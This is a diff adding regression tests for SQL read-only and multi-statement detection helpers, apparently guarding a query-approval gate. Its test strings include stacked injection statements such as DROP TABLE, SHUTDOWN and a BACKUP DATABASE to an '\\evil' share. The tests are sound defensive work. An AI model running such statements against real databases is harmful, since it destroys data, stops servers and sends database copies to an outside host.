@@ -40,7 +40,52 @@ def test_read_only_safe_ignores_keywords_inside_literals():
 def test_strip_and_multi_statement_helpers():
     assert "';UPDATE" not in strip_sql_literals("SELECT '--' ; x")
     assert is_multi_statement("SELECT 1; DROP TABLE t") is True
-    assert is_multi_statement("SELECT 1 WHERE x = 'a;b'") is False  # ; in literal? no, this has no literal-strip
+    # ';' inside a literal is data — but is_multi_statement's contract is to
+    # receive literal-STRIPPED text (all callers strip first), so test it that
+    # way. On raw text the any-';' rule would (correctly) see the literal's ';'.
+    assert is_multi_statement(strip_sql_literals("SELECT 1 WHERE x = 'a;b'")) is False
+
+
+def test_multi_statement_flags_any_stacked_verb_not_just_allowlisted():
+    """R-4 C1 regression: SQL Server's direct path (pytds) runs the WHOLE
+    ';'-batch, so ANY second statement is dangerous — not only ones starting
+    with a keyword the old allowlist happened to list. A safe SELECT prefix
+    followed by a T-SQL verb that was NOT allowlisted (SHUTDOWN/BACKUP/RESTORE/
+    DENY/RECONFIGURE/DISABLE TRIGGER/a custom EXEC) was auto-executing without
+    approval. Both the multi-statement helper and the read-only gate must catch
+    every one."""
+    for sql in [
+        "SELECT 1; SHUTDOWN",
+        "SELECT 1; BACKUP DATABASE appdb TO DISK=N'\\\\evil\\share\\a.bak'",
+        "SELECT 1; RESTORE DATABASE appdb FROM DISK=N'a.bak'",
+        "SELECT 1; DENY SELECT ON dbo.t TO app",
+        "SELECT 1; RECONFIGURE",
+        "SELECT 1; DISABLE TRIGGER trg ON dbo.t",
+        "SELECT 1; EXEC dbo.SomeCustomProc",
+    ]:
+        assert is_multi_statement(strip_sql_literals(sql)) is True, sql
+        assert is_read_only_safe(sql) is False, sql
+
+
+def test_single_statement_with_trailing_semicolon_is_not_multi():
+    """A single statement, with or without a trailing ';' (and whitespace, or
+    repeated empty ';'), is NOT multi — the rule strips trailing separators
+    before looking for an interior one."""
+    for sql in ["SELECT 1", "SELECT 1;", "SELECT 1 ;  ", "SELECT 1;;"]:
+        assert is_multi_statement(strip_sql_literals(sql)) is False, sql
+        assert is_read_only_safe(sql) is True, sql
+
+
+def test_semicolon_inside_literal_is_not_multi_after_strip():
+    """A ';' inside a string literal is data, not a separator: once literals are
+    stripped it must NOT read as multi-statement (keywords inside the literal go
+    too, so these stay read-only safe)."""
+    for sql in [
+        "SELECT * FROM t WHERE note = 'a;b'",
+        "SELECT * FROM t WHERE note = 'xp_cmdshell; drop'",
+    ]:
+        assert is_multi_statement(strip_sql_literals(sql)) is False, sql
+        assert is_read_only_safe(sql) is True, sql
 
 
 def test_mysql_executable_comment_content_is_preserved():
